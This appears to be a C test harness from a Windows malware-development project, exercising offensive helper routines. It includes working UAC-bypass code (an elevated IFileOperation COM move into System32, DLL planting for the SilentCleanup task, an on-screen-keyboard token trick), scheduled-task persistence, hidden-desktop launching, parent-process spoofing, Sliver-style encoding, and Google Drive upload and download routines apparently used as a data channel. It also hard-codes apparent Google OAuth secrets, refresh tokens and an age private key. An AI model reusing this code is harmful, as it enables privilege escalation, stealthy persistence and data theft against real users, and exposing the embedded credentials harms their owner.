#include <Windows.h>
#include <Utils.h>
#include <stdio.h>
#include <Shlwapi.h>
#include <strsafe.h>
#include <shlobj_core.h>
#include <winhttp.h>
#include <Communication.h>
#include <sddl.h>

VOID Callback
(
	_In_ BSTR lpInput,
	_In_ LPVOID Arg
)
{
	LPWSTR lpDllPath = (LPWSTR)Arg;
	LPSTR szFolderName, szTemp;
	CHAR szTempPath[MAX_PATH];

	szFolderName = StrStrA(lpInput, "\tFileName = \"") + lstrlenA("\tFileName = \"");
	szTemp = StrChrA(szFolderName, '"');
	szTemp[0] = '\0';
	GetTempPathA(MAX_PATH, szTempPath);
	lstrcatA(szTempPath, "\\");
	lstrcatA(szTempPath, szFolderName);
	printf("szTempPath: %s\n", szTempPath);
	//CopyFileWp(lpDllPath, szTempPath, FALSE);
}

VOID StartTaskThread()
{
	HANDLE hEvent = NULL;

	while (TRUE) {
		hEvent = OpenEventW(EVENT_ALL_ACCESS, FALSE, L"EventSink");
		if (hEvent != NULL) {
			break;
		}

		Sleep(2000);
	}

	if (!StartTask(L"\\Microsoft\\Windows\\DiskCleanup\\SilentCleanup")) {
		return;
	}
}

VOID test1() {
	HANDLE hThread = NULL;

	hThread = CreateThread(NULL, 0, StartTaskThread, NULL, 0, NULL);
	if (hThread == NULL) {
		return;
	}

	RegisterAsyncEvent(L"SELECT * FROM __InstanceCreationEvent WITHIN 1 WHERE TargetInstance ISA \"Win32_Directory\" AND TargetInstance.Drive = \"C:\" AND TargetInstance.Path = \"\\\\Users\\\\Admin\\\\AppData\\\\Local\\\\Temp\\\\\" AND TargetInstance.FileName LIKE \"________-____-____-____-____________\"", Callback, L"C:\\Users\\Admin\\Desktop\\LogProvider.dll");
	return 0;
}

VOID test2
(
	_In_ LPWSTR lpDllPath
)
{
	PBYTE pOutput = NULL;
	DWORD dwSize = 0;
	WCHAR wszPath[MAX_PATH] = L"C:\\Users\\Admin\\Desktop\\Test.exe";
	LPSTR szFolderName, szTemp;
	CHAR szTempPath[MAX_PATH];

	if (!CreateProcessAndGetOutput(wszPath, &pOutput, &dwSize)) {
		LogError(L"Error: 0x%08x\n", GetLastError());
	}

	szFolderName = StrStrA(pOutput, "\tFileName = \"") + lstrlenA("\tFileName = \"");
	szTemp = StrChrA(szFolderName, '"');
	szTemp[0] = '\0';
	GetTempPathA(MAX_PATH, szTempPath);
	lstrcatA(szTempPath, "\\");
	lstrcatA(szTempPath, szFolderName);
	CopyFileWp(lpDllPath, szTempPath, FALSE);
}

BOOL IsGUIDStringW
(
	_In_ LPWSTR lpInput
)
{
	// 01234567-0123-0123-0123-0123456789ab
	DWORD dwLength = lstrlenW(lpInput);
	UINT32 i, j;
	WCHAR AllowedCharacters[] = { L'a', L'b', L'c', L'd', L'e', L'f', L'A', L'B', L'C', L'D', L'E', L'F' };
	BOOL bIsOk = FALSE;

	if (lpInput[8] != L'-' || lpInput[13] != L'-' || lpInput[18] != L'-' || lpInput[23] != L'-') {
		return FALSE;
	}

	lpInput[8] = L'0';
	lpInput[13] = L'0';
	lpInput[18] = L'0';
	lpInput[23] = L'0';
	for (i = 0; i < dwLength; i++) {
		for (j = 0; j < _countof(AllowedCharacters); j++) {
			if (lpInput[i] == AllowedCharacters[j] || (lpInput[i] >= L'0' && lpInput[i] <= '9')) {
				bIsOk = TRUE;
				break;
			}
		}

		if (!bIsOk) {
			return FALSE;
		}
	}

	lpInput[8] = L'-';
	lpInput[13] = L'-';
	lpInput[18] = L'-';
	lpInput[23] = L'-';
	return TRUE;
}

BOOL PrintFileName(
	_In_ HANDLE hDir,
	_In_ LPWSTR lpPath,
	_In_ LPVOID lpParameters
)
{
	LPWSTR lpFileName = PathFindFileNameW(lpPath);
	LPWSTR lpDirName;
	LPWSTR lpOutput = (LPWSTR)lpParameters;

	if (StrCmpW(lpFileName, L"LogProvider.dll")) {
		return FALSE;
	}

	lpFileName[-1] = L'\0';
	lpDirName = PathFindFileNameW(lpPath);
	if (!IsGUIDStringW(lpDirName)) {
		return FALSE;
	}

	CloseHandle(hDir);
	StrCpyW(lpOutput, lpPath);
}

VOID test3
(
	_In_ LPWSTR lpMaliciousDll
)
{
	WCHAR wszLogProvider[MAX_PATH];
	DWORD dwResult;
	HANDLE hFile = INVALID_HANDLE_VALUE;

	ZeroMemory(wszLogProvider, sizeof(wszLogProvider));
	WatchFileCreationEx(L"C:\\Users\\Admin\\AppData\\Local\\Temp", TRUE, PrintFileName, wszLogProvider);
	LogError(L"%lls\n", wszLogProvider);
	if (!IsFolderExist(wszLogProvider)) {
		LogError(L"Folder not exist!\n");
		return;
	}

	StrCatW(wszLogProvider, L"\\LogProvider.dll");
	if (!IsFileExist(wszLogProvider)) {
		LogError(L"File not exist!\n");
		return;
	}

	if (!CopyFileWp(lpMaliciousDll, wszLogProvider, TRUE)) {
		LogError(L"Failed to copy dll: 0x%08x\n", GetLastError());
		return;
	}

	LogError(L"dwResult = 0x%08x\n", dwResult);
	hFile = CreateFileW(wszLogProvider, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		LogError(L"Failed to open dll: 0x%08x\n", GetLastError());
		return;
	}

	Sleep(1000000);
}

void test4() {
	printf("%s\n", ConvertWcharToChar(L"Hello World"));
	LogError(L"%lls\n", ConvertCharToWchar("Hello World"));
}

void test5() {
	CHAR szUserAgent[] = "curl/7.83.1";
	CHAR szClientId[] = "178467925713-lerc06071od46cr41r3f5fjc1ml56n76.apps.googleusercontent.com";
	CHAR szClientSecret[] = "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";
	CHAR szRefreshToken[] = "1//04U3_Gum8qlGvCgYIARAAGAQSNwF-L9IrmGLxFDUJTcb8IGojFuflKaNFqpQolUQI8ANjXIbrKe0Fq_7VzJUnt0hba15FOoUCJig";
	PDRIVE_CONFIG pGoogleDriverObj = NULL;
	pGoogleDriverObj = GoogleDriveInit(szUserAgent, szClientId, szClientSecret, szRefreshToken);
	RefreshAccessToken(pGoogleDriverObj);
	GoogleDriveUpload(pGoogleDriverObj, L"C:\\Users\\Admin\\Downloads\\json.hpp");
}

void test6() {
	CHAR szUserAgent[] = "curl/7.83.1";
	CHAR szClientId[] = "178467925713-lerc06071od46cr41r3f5fjc1ml56n76.apps.googleusercontent.com";
	CHAR szClientSecret[] = "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";
	CHAR szRefreshToken[] = "1//04U3_Gum8qlGvCgYIARAAGAQSNwF-L9IrmGLxFDUJTcb8IGojFuflKaNFqpQolUQI8ANjXIbrKe0Fq_7VzJUnt0hba15FOoUCJig";
	LPSTR lpFileId = NULL;
	PDRIVE_CONFIG pGoogleDriverObj = NULL;
	pGoogleDriverObj = GoogleDriveInit(szUserAgent, szClientId, szClientSecret, szRefreshToken);
	RefreshAccessToken(pGoogleDriverObj);
	if (!GetFileId(pGoogleDriverObj, "11-7-2024-16-55-12.hpp", &lpFileId) || lpFileId == NULL) {
		LogError(L"GetFileId failed at %lls\n", __FUNCTIONW__);
		return;
	}

	if (!GoogleDriveDownload(pGoogleDriverObj, lpFileId)) {
		LogError(L"GoogleDriveDownload failed at %lls\n", __FUNCTIONW__);
		return;
	}
}

void test7() {
	CHAR szKey[] = { 231, 121, 89, 214, 23, 251, 49, 23, 236, 76, 192, 5, 20, 135, 151, 126, 176, 103, 181, 0, 131, 195, 5, 20, 64, 243, 54, 65, 45, 46, 151, 150 };
	CHAR szNonce[] = { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1 };
	PBYTE pCipherText = NULL;
	CHAR szPlainText[] = { 224, 233, 149, 125, 99, 245, 90, 7, 96, 115, 115, 148, 209, 93, 172, 122, 107, 122, 3, 27, 34, 63, 79, 48, 19, 49, 81, 114, 25, 182, 115, 60, 10, 32, 251, 113, 100, 7, 2, 43, 116, 89, 213, 134, 47, 155, 113, 206, 255, 156, 45, 214, 193, 173, 94, 231, 160, 3, 90, 47, 143, 78, 239, 13, 173, 21 };
	LPSTR lpOutput = NULL;
	DWORD cbCipherText = 0;

	Chacha20Poly1305Encrypt(szKey, szNonce, szPlainText, sizeof(szPlainText), NULL, 0, &pCipherText, &cbCipherText);
	lpOutput = ConvertToHexString(pCipherText, cbCipherText);
	printf("%s\n", lpOutput);
	FREE(lpOutput);
	//Chacha20Poly1305Decrypt(szKey, szNonce, szCipherText, szPlainText, lstrlenA("test"));
}

void test8() {
	BYTE Buffer[] = { 152, 160, 197, 161, 181, 205, 97, 250, 161, 153 };
	LPSTR lpHexString = NULL;
	PBYTE pByteArray = NULL;
	lpHexString = ConvertToHexString(Buffer, _countof(Buffer));
	printf("lpHexString = %s\n", lpHexString);
	pByteArray = FromHexString(lpHexString);
	for (DWORD i = 0; i < _countof(Buffer); i++) {
		if (Buffer[i] != pByteArray[i]) {
			printf("Failed at %d\n", i);
			break;
		}
	}

	FREE(lpHexString);
	FREE(pByteArray);
}

void test9() {
	PBYTE pHashDigest = ComputeSHA256("Hello World", lstrlenA("Hello World"));
	LPSTR lpHexDigest = ConvertToHexString(pHashDigest, 32);
	printf("Hex digest: %s\n", lpHexDigest);
	FREE(pHashDigest);
	FREE(lpHexDigest);
	return;
}

void test10() {
	LPSTR lpOutput = NULL;
	PBYTE HMac = GenerateHmacSHA256("Secret Key", lstrlenA("Secret Key"), "Hello World", lstrlenA("Hello World"));
	lpOutput = ConvertToHexString(HMac, 32);
	printf("lpOutput: %s\n", lpOutput);
	FREE(HMac);
	return;
}

void test11() {
	CHAR szInput[] = "age1c6j0mssdmznty6ahkckmhwszhd3lquupd5rqxnzlucma482yvspsengc59";
	PBYTE pOutput;
	DWORD cbOutput = 0;
	CHAR szHrp[0x20];
	LPSTR lpOutput = NULL;

	RtlSecureZeroMemory(szHrp, sizeof(szHrp));
	Bech32Decode(szHrp, &pOutput, &cbOutput, szInput);
	lpOutput = ConvertToHexString(pOutput, cbOutput);
	printf("szOutput: %s\n", lpOutput);
	return;
}

void test12() {
	BYTE a[] = { 0x4c, 0x4a, 0x3a, 0x8a, 0xa4, 0xc, 0xa7, 0xe9, 0xc8, 0x50, 0xf9, 0x2e, 0x3c, 0x5b, 0xa3, 0x2, 0x21, 0xc0, 0x4a, 0x6a, 0xe3, 0x3e, 0xb6, 0xc0, 0x26, 0x5f, 0xb2, 0xb9, 0xc4, 0xf0, 0x92, 0xa7 };
	BYTE b[] = { 0x9, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0 };
	BYTE c[0x20] = { 0 };
	ComputeX25519(c, a, b);
	LPSTR lpOutput = ConvertToHexString(c, sizeof(c));
	printf("lpOutput: %s\n", lpOutput);
	FREE(lpOutput);
}

void test13() {
	CHAR szInfo[] = "hkdf-example";
	CHAR szKey[] = "input key";
	BYTE Salt[] = { 188, 49, 67, 71, 174, 231, 83, 62, 183, 47, 136, 245, 54, 178, 101, 135, 50, 72, 41, 97, 103, 184, 5, 86, 223, 122, 35, 123, 76, 235, 87, 30 };
	PBYTE pOutput = NULL;
	LPSTR lpOutput = NULL;

	pOutput = HKDFGenerate(Salt, sizeof(Salt), szKey, lstrlenA(szKey), NULL, 0, 41);
	lpOutput = ConvertToHexString(pOutput, 41);
	printf("lpOutput: %s\n", lpOutput);
	FREE(lpOutput);
	FREE(pOutput);
	return;
}

void test14() {
	BYTE FileKey[] = { 0xca, 0x98, 0xb5, 0xff, 0x69, 0xc9, 0x5a, 0xb7, 0x19, 0x67, 0xc6, 0xe4, 0x33, 0x5c, 0x68, 0xf5 };
	BYTE TheirPubKey[] = { 0xdd, 0x55, 0x44, 0xfc, 0xae, 0xae, 0x32, 0xea, 0xd, 0x6, 0x2e, 0x7b, 0x13, 0x46, 0xca, 0x53, 0xb5, 0xde, 0xc, 0x53, 0x2e, 0x8c, 0x6, 0xbd, 0xbc, 0x58, 0x9e, 0x6e, 0xa9, 0xa7, 0x8d, 0x61 };
	PSTANZA pResult = NULL;
	LPSTR lpOutput = NULL;

	pResult = AgeRecipientWrap(FileKey, sizeof(FileKey), TheirPubKey);
	lpOutput = ConvertToHexString(pResult->pBody, 32);
	printf("lpOutput: %s\n", lpOutput);
	FREE(lpOutput);
	FREE(pResult);
}

void test15() {
	CHAR szRecipientPubKey[] = "age103wh7xqpzhd3m3qmjf69z57equeecl057y0nh5fgfdr3np455c0qknjum8";
	BYTE PlainText[] = { 10, 32, 160, 8, 226, 25, 133, 57, 45, 26, 159, 50, 208, 44, 0, 207, 249, 243, 54, 158, 66, 199, 50, 184, 3, 16, 128, 176, 16, 14, 190, 185, 202, 227 };
	DWORD cbOutput = 0;
	PBYTE pCipherText = NULL;

	pCipherText = AgeEncrypt(szRecipientPubKey, PlainText, sizeof(PlainText), &cbOutput);
	HexDump(pCipherText, 266);
	FREE(pCipherText);
}

void test16() {
	MessageBoxW(NULL, L"Hello World", L"Title", MB_OK);
	return 0;
}

void test17() {
	CHAR wszInput[] = "As before, a side effect of this design is that when a function returns the same value as one of its callees, it needs to read the return value from the callee from its own activation record, then place it back onto the stack at a return value in its caller’s activation record. Tail call optimizations (TCO) thus remain impossible.";
	LPSTR lpOutput = NULL;

	lpOutput = StrReplaceA(wszInput, "a", "bbbbbbbbb", TRUE, 0);
	printf("%s\n", wszInput);
	printf("-----------------------------\n");
	printf("%s\n", lpOutput);
	FREE(lpOutput);
}

void test18() {
	LPSTR lpOutput = GenGUIDStrA();
	printf("%s\n", lpOutput);
	FREE(lpOutput);
}

void test19() {
	WTStartPersistence("C:\\Users\\Admin\\source\\repos\\MalDev\\x64\\Debug\\Test.exe");
	return;
}

void test20() {
	LPWSTR* pArray = NULL;
	DWORD dwSize = 0;

	pArray = ListFileWithFilter(L"C:\\Users\\Admin\\Desktop\\Apps", L"*T*", 0, &dwSize);
	if (pArray != NULL && dwSize > 0) {
		for (DWORD i = 0; i < dwSize; i++) {
			LogError(L"%lls\n", pArray[i]);
		}
	}
}

void test21
(
	_In_ LPSTR lpCommandLine
)
{
	HANDLE hProc = NULL;
	HANDLE hToken = NULL;
	DWORD dwPid = 0;
	SECURITY_ATTRIBUTES sa;
	HANDLE hDuplicatedToken = NULL;
	TOKEN_MANDATORY_LABEL TokenInfo;
	PSID pSid = NULL;
	LPWSTR lpTempPath = NULL;
	CHAR szVbsContent[] = "Set troll = WScript.CreateObject(\"WScript.Shell\")\ntroll.Run \"taskmgr.exe\"\nWScript.Sleep 250\ntroll.SendKeys \"%\"\nWScript.Sleep 250\ntroll.SendKeys \"{F}\"\nWScript.Sleep 250\ntroll.SendKeys \"{ENTER}\"\nWScript.Sleep 250\ntroll.SendKeys \"^v\"\ntroll.SendKeys \"{TAB}\"\nWScript.Sleep 250\ntroll.SendKeys \"{+}\"\nWScript.Sleep 250\ntroll.SendKeys \"{ENTER}\"\nWScript.Sleep 250\ntroll.AppActivate(\"Task Manager\")\ntroll.SendKeys \"%{f4}\"";
	LPWSTR lpCscriptCommandLine = NULL;
	STARTUPINFOW si;
	PROCESS_INFORMATION pi;
	HGLOBAL hMem = NULL;
	LPWSTR lpGlobalMem = NULL;
	LPWSTR lpTemp = NULL;

	SHELLEXECUTEINFOW sei = { sizeof(sei) };
	sei.lpVerb = L"open";
	sei.lpFile = L"osk.exe";
	sei.nShow = SW_SHOW;
	sei.fMask |= SEE_MASK_NOCLOSEPROCESS;

	if (!ShellExecuteExW(&sei)) {
		LogError(L"CreateProcessW failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
		goto CLEANUP;
	}

	dwPid = GetProcessId(sei.hProcess);
	CloseHandle(sei.hProcess);
	LogError(L"dwPid = %d\n", dwPid);
	hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_TERMINATE, TRUE, dwPid);
	if (hProc == NULL) {
		LogError(L"OpenProcess failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
		goto CLEANUP;
	}

	if (!OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken)) {
		LogError(L"OpenProcessToken failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
		goto CLEANUP;
	}

	RtlSecureZeroMemory(&sa, sizeof(sa));
	if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, &sa, SecurityImpersonation, TokenPrimary, &hDuplicatedToken)) {
		LogError(L"DuplicateTokenEx failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
		goto CLEANUP;
	}

	RtlSecureZeroMemory(&TokenInfo, sizeof(TokenInfo));
	ConvertStringSidToSidW(SDDL_ML_MEDIUM, &pSid);
	TokenInfo.Label.Sid = pSid;
	if (!SetTokenInformation(hDuplicatedToken, TokenIntegrityLevel, &TokenInfo, sizeof(TokenInfo))) {
		LogError(L"SetTokenInformation failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
		goto CLEANUP;
	}

	if (!WriteToTempPath(szVbsContent, lstrlenA(szVbsContent), L"vbs", &lpTempPath)) {
		goto CLEANUP;
	}

	hMem = GlobalAlloc(GMEM_MOVEABLE, (lstrlenA(lpCommandLine) + 1) * sizeof(WCHAR));
	if (hMem == NULL) {
		LogError(L"GlobalAlloc failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
		goto CLEANUP;
	}

	lpGlobalMem = GlobalLock(hMem);
	lpTemp = ConvertCharToWchar(lpCommandLine);
	lstrcpyW(lpGlobalMem, lpTemp);
	lpGlobalMem[lstrlenW(lpGlobalMem)] = L'\0';
	GlobalUnlock(hMem);
	if (!OpenClipboard(NULL)) {
		LogError(L"OpenClipboard failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
		goto CLEANUP;
	}

	if (!EmptyClipboard()) {
		LogError(L"EmptyClipboard failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
		goto CLEANUP;
	}

	if (!SetClipboardData(CF_UNICODETEXT, hMem)) {
		LogError(L"SetClipboardData failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
		goto CLEANUP;
	}

	CloseClipboard();
	lpCscriptCommandLine = ALLOC((lstrlenW(lpTempPath) + 21) * sizeof(WCHAR));
	lstrcpyW(lpCscriptCommandLine, L"cscript.exe /NOLOGO ");
	lstrcatW(lpCscriptCommandLine, lpTempPath);
	RtlSecureZeroMemory(&si, sizeof(si));
	RtlSecureZeroMemory(&pi, sizeof(pi));
	si.cb = sizeof(si);
	if (!CreateProcessAsUserW(hDuplicatedToken, NULL, lpCscriptCommandLine, &sa, &sa, FALSE, 0, NULL, NULL, &si, &pi)) {
		LogError(L"CreateProcessAsUserW failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
		goto CLEANUP;
	}

	WaitForSingleObject(pi.hProcess, INFINITE);
	DeleteFileW(lpTempPath);
	TerminateProcess(hProc, 0);
CLEANUP:
	if (lpTemp != NULL) {
		FREE(lpTemp);
	}

	if (hMem != NULL) {
		GlobalFree(hMem);
	}

	if (pi.hThread != NULL) {
		CloseHandle(pi.hThread);
	}

	if (pi.hProcess != NULL) {
		CloseHandle(pi.hProcess);
	}
	return;
}

void test22() {
	for (DWORD i = 0; i < 1000; i++) {
		LogError(L"#%d: ", i);
		IsSystemLock();
		Sleep(1000);
	}
}

void test23() {
	BypassByOsk("cmd /C \"cd C:\\Users\\Admin\\Desktop && whoami /priv > a.txt\"");
}

void test24() {
	WCHAR wszCommandLine[] = L"D:\\Documents\\source\\repos\\MalDev\\x64\\Debug\\1Test.exe";
	CreateProcessWithDesktop(wszCommandLine, L"Hidden Desktop");
}

void test25() {
	STARTUPINFOW si;
	PROCESS_INFORMATION pi;

	RtlSecureZeroMemory(&si, sizeof(si));
	RtlSecureZeroMemory(&pi, sizeof(pi));
	si.cb = sizeof(si);
	si.dwFlags |= STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_SHOW;
	if (!CreateProcessW(L"C:\\Windows\\System32\\osk.exe", L"C:\\Windows\\System32\\osk.exe ", NULL, NULL, FALSE, CREATE_DEFAULT_ERROR_MODE | CREATE_UNICODE_ENVIRONMENT | CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
		LogError(L"CreateProcessW failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
	}

	if (pi.hThread != NULL) {
		CloseHandle(pi.hThread);
	}

	if (pi.hProcess != NULL) {
		CloseHandle(pi.hProcess);
	}
}

void test26() {
	SIZE_T cbList = 0;
	PPROC_THREAD_ATTRIBUTE_LIST pAttrList = NULL;

	InitializeProcThreadAttributeList(NULL, 8, 0, &cbList);
	HANDLE hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, 27644);
	pAttrList = ALLOC(cbList);
	if (!InitializeProcThreadAttributeList(pAttrList, 8, 0, &cbList)) {
		LogError(L"InitializeProcThreadAttributeList failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
		return;
	}

	if (!UpdateProcThreadAttribute(pAttrList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, sizeof(hParent), NULL, NULL)) {
		LogError(L"InitializeProcThreadAttributeList failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
		return;
	}
}

void test27() {
	LogError(L"Hello World");
}

void test28() {
	MasqueradedMoveCopyDirectoryFileCOM(L"C:\\Users\\Admin\\Desktop\\a.txt", L"C:\\Windows\\System32", FALSE);
}

void test29()
{
	BOOL                cond = FALSE;
	IFileOperation* FileOperation1 = NULL;
	IShellItem* isrc = NULL, * idst = NULL;
	BIND_OPTS3          bop;
	SHELLEXECUTEINFOW   shexec;
	HRESULT             r;

	do {

		r = CoInitialize(NULL);
		if (r != S_OK)
			break;

		RtlSecureZeroMemory(&bop, sizeof(bop));
		RtlSecureZeroMemory(&shexec, sizeof(shexec));

		r = CoCreateInstance(&CLSID_FileOperation, NULL,
			CLSCTX_INPROC_SERVER | CLSCTX_LOCAL_SERVER | CLSCTX_INPROC_HANDLER, &IID_IFileOperation, &FileOperation1);

		if (r != S_OK) {
			break;
		}

		if (FileOperation1 != NULL) {
			FileOperation1->lpVtbl->Release(FileOperation1);
		}

		bop.cbStruct = sizeof(bop);
		bop.dwClassContext = CLSCTX_INPROC_SERVER | CLSCTX_LOCAL_SERVER/* | CLSCTX_INPROC_HANDLER*/;
		r = CoGetObject(L"Elevation:Administrator!new:{3ad05575-8857-4850-9277-11b85bdb8e09}", (BIND_OPTS*)&bop, &IID_IFileOperation, &FileOperation1);
		if (r != S_OK) {
			break;
		}
		if (FileOperation1 == NULL) {
			r = E_FAIL;
			break;
		}

		FileOperation1->lpVtbl->SetOperationFlags(FileOperation1,
			FOF_NOCONFIRMATION | FOF_SILENT | FOFX_SHOWELEVATIONPROMPT | FOFX_NOCOPYHOOKS | FOFX_REQUIREELEVATION);

		r = SHCreateItemFromParsingName(L"C:\\temp\\ntwdblib.dll",
			NULL, &IID_IShellItem, &isrc);

		if (r != S_OK) {
			break;
		}
		r = SHCreateItemFromParsingName(L"C:\\windows\\system32\\", NULL, &IID_IShellItem, &idst);
		if (r != S_OK) {
			break;
		}

		r = FileOperation1->lpVtbl->MoveItem(FileOperation1, isrc, idst, NULL, NULL);
		if (r != S_OK) {
			break;
		}
		r = FileOperation1->lpVtbl->PerformOperations(FileOperation1);
		if (r != S_OK) {
			break;
		}

		idst->lpVtbl->Release(idst);
		idst = NULL;
		isrc->lpVtbl->Release(isrc);
		isrc = NULL;

		shexec.cbSize = sizeof(shexec);
		shexec.fMask = SEE_MASK_NOCLOSEPROCESS;
		shexec.nShow = SW_SHOW;

		shexec.lpFile = L"C:\\windows\\system32\\cliconfg.exe";
		shexec.lpParameters = NULL;
		shexec.lpDirectory = L"C:\\windows\\system32\\";
		if (ShellExecuteExW(&shexec)) {
			if (shexec.hProcess != NULL) {
				WaitForSingleObject(shexec.hProcess, INFINITE);
				CloseHandle(shexec.hProcess);
			}
		}

	} while (cond);

	if (FileOperation1 != NULL) {
		FileOperation1->lpVtbl->Release(FileOperation1);
	}
	if (isrc != NULL) {
		isrc->lpVtbl->Release(isrc);
	}
	if (idst != NULL) {
		idst->lpVtbl->Release(idst);
	}
	CoUninitialize();
}

void test30() {
	PBYTE pBuffer = NULL;
	DWORD cbBuffer = 0;

	pBuffer = ReadFromFile(L"C:\\Windows\\System32\\cmd.exe", &cbBuffer);
	IeAddOnInstallMethod(pBuffer, cbBuffer);
	FREE(pBuffer);
}

void test31() {
	LPWSTR List[] = {L"Zalo.exe", L"SystemInformer.exe", L"chrome.exe", L"steam.exe", L"wallpaper32.exe", L"SnippingTool.exe"};
	BOOL Result = FALSE;

	Result = AreProcessesRunning(List, _countof(List), 0);
	wprintf(L"Result = %d\n", Result);
}

void test32() {
	CreateAtLogonTask(L"Calc", L"C:\\Windows\\System32\\calc.exe");
}

void test33() {
	MasqueradedMoveCopyDirectoryFileCOM(L"C:\\Users\\Admin\\Desktop\\ida.hexli", L"C:\\Windows\\System32", FALSE);
}

void test34() {
	STARTUPINFOW si;
	PROCESS_INFORMATION pi;

	RtlSecureZeroMemory(&si, sizeof(si));
	RtlSecureZeroMemory(&pi, sizeof(pi));
	si.cb = sizeof(si);
	CreateProcessW(L"C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);
}

void test35() {
	CHAR szRecipientPubKey[] = "age103wh7xqpzhd3m3qmjf69z57equeecl057y0nh5fgfdr3np455c0qknjum8";
	BYTE PrivateKey[] = "AGE-SECRET-KEY-1H8ACTYAEN9TN8XM4FNJR0KLAFR0FDMAQ8NTJTLKU3JZA6TWR7QSQ206NN8";
	BYTE PublicKey[] = "age1e983tu02e4ht5m5s3kdc8gcddpqs8jvkdft4644e80ngnh3rrvvqw06pk2";
	PBYTE pCipherText = NULL;
	DWORD cbCipherText = 0;
	BYTE PlainText[] = { 10, 32, 207, 232, 22, 198, 58, 9, 197, 243, 173, 16, 93, 130, 177, 56, 205, 148, 33, 17, 156, 162, 199, 197, 246, 217, 49, 150, 20, 146, 123, 199, 136, 248 };

	pCipherText = AgeKeyExToServer(szRecipientPubKey, PrivateKey, PublicKey, PlainText, _countof(PlainText), &cbCipherText);
	HexDump(pCipherText, cbCipherText);
	FREE(pCipherText);
}

void test36() {
	CHAR szEncodedStr[] = "SGVsbG8gV29ybGQ=";
	DWORD cbOutput = 0;
	LPSTR lpOutput = NULL;

	lpOutput = Base64Decode(szEncodedStr, &cbOutput);
	printf("lpOutput: %s, cbOutput: %d\n", lpOutput, cbOutput);
	FREE(lpOutput);
}

void test37() {
	BYTE CipherText[] = { 69, 100, 241, 205, 130, 19, 84, 64, 192, 139, 144, 144, 76, 102, 126, 178, 220, 49, 255, 50, 134, 6, 178, 19, 111, 101, 235, 109, 142, 220, 80, 109, 83, 183, 239, 211, 11, 38, 88, 81, 137, 198, 77, 175, 46, 180, 204, 247, 145, 70, 196, 223, 12, 79, 33, 202, 34, 241, 49, 43, 148, 167, 117, 64, 16, 81, 209, 90, 0, 122, 22, 15, 152, 4, 231, 162, 192, 64, 243, 108, 238, 189, 23, 193, 98, 223, 142, 236, 212, 44, 235, 226, 231, 187, 60, 154, 189, 50, 249, 188, 89, 56, 43, 67, 65, 253, 119, 243, 213, 25, 193, 238, 178, 173, 183, 205, 29, 36, 124, 149, 53, 236, 5, 153, 56, 160, 183, 249, 239, 241, 147, 240, 71, 202, 142, 114, 243, 109, 6, 173, 198, 119, 218, 123, 240, 242, 190, 91, 186, 14, 18, 149, 249, 58, 12, 16, 119, 211 };
	LPSTR lpOutput = NULL;

	lpOutput = SliverBase64Encode(CipherText, _countof(CipherText));
	printf("%s\n", lpOutput);
	FREE(lpOutput);
}

void test38() {
	CHAR szEncoded[] = "osqOP-fq_c2a3+bnqduYKLNOZPhd0Jfqw8tJw-VxrdRqLYZqb9u-r-FdqvWMLjPS4rwcSNOmfxG3WqcJDhyRn00oQ_GazB-mEaqFGK0aW8PM7oA0-LYlVknKUYiFMP9v7qi+754ThQk0ZtAPRoF0VJhLLWQy6e9_kzN5Eq31LZF7WumNoWIlx7kL0ISdyXHVWmhYsVGlcHt+l1NnyXj";
	DWORD cbOutput = 0;
	PBYTE pOutput = NULL;

	pOutput = SliverBase64Decode(szEncoded, &cbOutput);
	HexDump(pOutput, cbOutput);
	FREE(pOutput);
}

void test39() {
//ciphertext: [215 190 130 252 218 223 208 64 145 245 200 191 120 166 117 39 247 175 213 254 90 176 114 227 88 74 101 152 126 71 85 245 71 239 103 37 96 226 54 91 158 35 48 129 251 22 128 241 181 99 22 125 223 36 196 128 242 24 181 16 125 37 43 69 167 174 190 88 47 87 160 1 75 238 167 144 121 26 248 213 14 170 51 57 190]
//2024 / 08 / 20 09:37 : 17 crypto.go : 201 : serverPublicKey : { [69 100] [244 157 174 224 222 195 116 201] [167 119 204 27 97 12 84 223 62 225 39 184 111 176 13 226 208 122 204 154 5 189 231 76 34 21 176 24 62 61 112 47] }
}

void test40() {
	CHAR wszInput[] = "aaaaaaNewaaaa to ubuntu and servers. I just finished installing a new ubuntu server and added LAMP. I can assess the webpage that I am hosting by typing in the web browser the IP address of the server. what I would like to know is how to access the same web page locally on my network from another computer using a name instead of the IP address.aaa";
	LPSTR* pResult = NULL;
	DWORD cbResult = 0;
	DWORD i = 0;

	pResult = StrSplitNA(wszInput, "a", 0, &cbResult);
	printf("cbResult = %d\n", cbResult);
	for (i = 0; i < cbResult; i++) {
		printf("%s\n", pResult[i]);
	}
